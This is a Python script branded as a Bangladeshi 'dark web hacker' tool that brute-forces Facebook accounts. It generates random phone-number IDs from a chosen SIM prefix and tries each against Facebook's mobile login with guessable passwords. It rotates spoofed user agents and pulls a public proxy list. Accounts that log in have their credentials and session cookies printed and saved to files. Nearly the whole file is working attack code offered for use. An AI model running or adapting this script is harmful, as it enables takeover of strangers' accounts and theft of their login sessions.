#𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 𝐃𝐀𝐑𝐊 𝐖𝐄𝐕 𝐇𝐀𝐂𝐊𝐄𝐑 𝐓𝐄𝐈𝐌#
#𝐃𝐀𝐑𝐊 𝐖𝐄𝐁 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘#
#𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆𝐂𝐘𝐁𝐄𝐑𝟕𝟏#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#-----------------color------------------
#green
gn ="\033[1;32m"
#purple
pn ="\033[1;35m"
#blow
bn = "\033[1;34m"
#red
rn = "\033[1;31m"
#yello
yn = "\033[1;33m"
#coyn
cn = "\033[1;36m"
#white
wn = "\033[1;37m"
#-------------------------bragraund color -----------------
red = '\033[1;41m'
green = '\033[1;42m'
yellow = '\033[1;43m'



#end color
ed = "\033[1;0m"

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	jubair=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(jubair)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    jubair=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(jubair)

for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	y=random.choice(['RMX3571','RMX3710','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	jubair=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(jubair)
os.system('clear')
print(f'{cn}plisee wait for update..................{gn} ')
os.system('git pull')
os.system('pkg update && pkg upgrade')
print(f'\033[1;33m{rn}follow my FaceBook Group{yn}.................{ed}')
#os.system("xdg-open https://www.facebook.com/groups/973947490452060/")
# LOGO
logo = (f'''\033[1;36m
      ⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⠀⢀⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⠀⠀⣠⣴⣦⡄⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀   ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣶⣿⣿⣿⣿⡀⣽⡿⣶⣦⡀⠀⠀⠀⠀⠀
   ⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡿⣿⣿⣿⣿⣆⠀⠀⠀⠀
   ⠀⠀⢻\033[1;31m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣦⠀⠀⠀
   ⠀⠀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣿⣿⣿⣿⣿⡿⢟⣿⣷⡀⠀
   ⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣿⣽⣿⣽⣾⣿⣿⣿⠛⠉⠉⠀⢈⣿⣿⡇⠀
   ⠀⠀⠀⢻⣿⣿⠛⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠡⠤⠄⠁⠀⠀⢻⣿⡇⠀
   ⠀⠀⠀⠘⣿⣿⠄⠀⠀⠀⠀⠀⣉⠙⠋\033[1;30m⢿⣿⣯⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⡃⠀
   ⠀⠀⠀⠀⢹⣿⣇⣀⠀⠈⠉⠉⠁⠀⣤⢠⣿⣿⣧⡆⣤⣤⡀⣾⣿⣿⣿⢠⡇⠀
   ⠀⠀⠀⠀⠀⣿⣿⣿⣷⣤⠄⣀⣴⣧⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠇⠀
   ⠀⠀⠀⠀⠀⠸⣿⣯⠉\033[34;1m⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡯⠁⡌⠀⠀
⠀   ⠀⠀⠀⠀⠀⠙⢿⡄⢿⣿⣿⣿⣿⣿⣎⠙⠻⠛⣁⣼⣿⣿⡿⠛⠁⡸⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠈\033[1;35m⢿⡄⠉⣿⡿⣿⣿⣿⣿⣷⣬⣿⡿⠟⠋⢀⣴⡞⠁⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀⠉⠉⠋⠉⠉⠁⠀⢀⣴⣿⡿⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠿⢃⣴⣿⣿⣿⠃⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠉
 \033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽
 \033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽  
              \033[1;31m██████╗  \033[1;30m█████╗ \033[34;1m██████╗ \033[1;32m██╗  ██╗
              \033[1;31m██╔══██╗\033[1;30m██╔══██╗\033[34;1m██╔══██╗\033[1;32m██║ ██╔╝
              \033[1;31m██║  ██║\033[1;30m███████║\033[34;1m██████╔╝\033[1;32m█████╔╝ 
              \033[1;31m██║  ██║\033[1;30m██╔══██║\033[34;1m██╔══██╗\033[1;32m██╔═██╗
              \033[1;31m██████╔╝\033[1;30m██║  ██║\033[34;1m██║  ██║\033[1;32m██║  ██╗
              \033[1;31m╚═════╝ \033[1;30m╚═╝  ╚═╝\033[34;1m╚═╝  ╚═╝\033[1;32m╚═╝  ╚═╝
                                
              \033[1;35m██╗  ██╗\033[1;37m██╗\033[0;93m███╗   ██╗ \033[1;36m██████╗   
              \033[1;35m██║ ██╔╝\033[1;37m██║\033[0;93m████╗  ██║\033[1;36m██╔════╝   
              \033[1;35m█████╔╝ \033[1;37m██║\033[0;93m██╔██╗ ██║\033[1;36m██║  ███╗  
              \033[1;35m██╔═██╗ \033[1;37m██║\033[0;93m██║╚██╗██║\033[1;36m██║   ██║  
              \033[1;35m██║  ██╗\033[1;37m██║\033[0;93m██║ ╚████║\033[1;36m╚██████╔╝  
              \033[1;35m╚═╝  ╚═╝\033[1;37m╚═╝\033[0;93m╚═╝  ╚═══╝ \033[1;36m╚═════╝
\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽
\033[0;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱  
    \033[0;93m🔰🎭 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 𝐃𝐀𝐑𝐊 𝐖𝐄𝐕 𝐇𝐀𝐂𝐊𝐄𝐑 𝐓𝐄𝐈𝐌🎭🔰
\033[0;93m'᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱                                                  
\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽                           
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 :𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐅𝐀𝐂𝐄𝐁𝐎𝐊 :𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐆𝐈𝐓𝐇𝐔𝐁 :𝐃𝐀𝐑𝐊-𝐊𝐈𝐍𝐆𝐂𝐘𝐁𝐄𝐑𝟕𝟏
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐓𝐎𝐎𝐋 𝐒𝐓𝐀𝐓𝐔𝐒 :𝐅𝐑𝐄𝐄
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐏𝐀𝐆𝐄 :𝐃𝐀𝐑𝐊𝐖𝐄𝐁𝐂𝐘𝐁𝐄𝐑𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘𝟒𝟎𝟒
\33[38;5;196m [>☠<] 𝐃𝐀𝐑𝐊[] 𝐊𝐈𝐍𝐆[🔰]\033[34;1m𝐓𝐎𝐎𝐋 𝐕𝐈𝐑𝐒𝐈𝐎𝐍 :𝟎.𝟗              
\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽
 \033[0;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ 
     \033[0;93m🎭🎭 𝐃𝐀𝐑𝐊 𝐖𝐄𝐁 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘  🎭🎭 
 \033[0;93m᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱                           
\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽''')
# MAIN MANU 
def Main():
        os.system("clear")
        print(logo)
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;33mRANDOM CLONE BD")
        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;33mCONTACT ADMIN")
        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31mEXIT")
        print(f"{yn}\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
        jubair =input("\n \033[1;35m[🌺\033[1;35m] \033[1;32mSELECTED YOUR OPTION : ")
        if jubair in ["1","01"]:
            sexy()
        if jubair in ["2","02"]:
        	os.system('xdg-open https://www.facebook.com/DARK.KING.X.404')
        if jubair in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
    print('\033[1;32m[🌺\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m016\033[1;32m]\033[1;35m [\033[1;32m017\033[1;35m] \033[1;33m[\033[1;34m018\033[1;33m] \033[1;34m[\033[1;33m019\033[1;34m]')
    print("\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
    code = input('\033[1;33m[💔\033[1;32m]\033[1;33m YOUR SIM CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print("\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
    print('\033[1;32m[🌺\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m3000\033[1;32m]\033[1;35m [\033[1;32m5000\033[1;35m] \033[1;33m[\033[1;34m10000\033[1;33m] ')
    print("\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
    limit = int(input('\033[1;33m[💔\033[1;32m]\033[1;33m YOUR LIMITED : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
        print('\033[1;33m[🌺\033[1;33m] \033[1;36mYOUR TOTAL IDS : \033[1;32m'+tl)
        print("\033[1;33m[🌺\033[1;33m] \033[1;36mYOUR SIM CODE  :\033[1;32m "+code)
        print('\033[1;33m[🌺\033[1;33m]\033[1;36m PLEASE WAIT CLONING START')
        print('\033[1;33m[🌺\033[1;33m] \033[1;36mSUPER FAST SPEED CLONING')
        print("\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(jubair,uid,pwx,tl)
    print(f"{yn}\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
    print(' [🌺] Your list complete')
    print(' [🌺] Thanks for use my tool')
    print("{yn}\033[38;5;46⊰᯽════════════\033[1;32m★\033[1;36m═════════════\033[1;32m★\033[1;35m════════════\033[1;32m★\033[0;93m═════════════⊰᯽")
def jubair(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;32m[DARK-KING-FIND]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'cache-control': 'max-age=0',
    'dpr': '1.7000000476837158',
    'referer': 'https://mbasic.facebook.com/login/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3461"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mDARK-KING-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[] COOKIE🌹 :\033[1;95m {coki}")
                open('/sdcard/DARK-KING-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mDARK-KING-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/DARK-KING-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
# END #


#follow my facebook page https://www.facebook.com/DARK.KING.X.404
#follow github https://github.com/DARK-KING404
#join our fb grup https://www.facebook.com/groups/973947490452060/
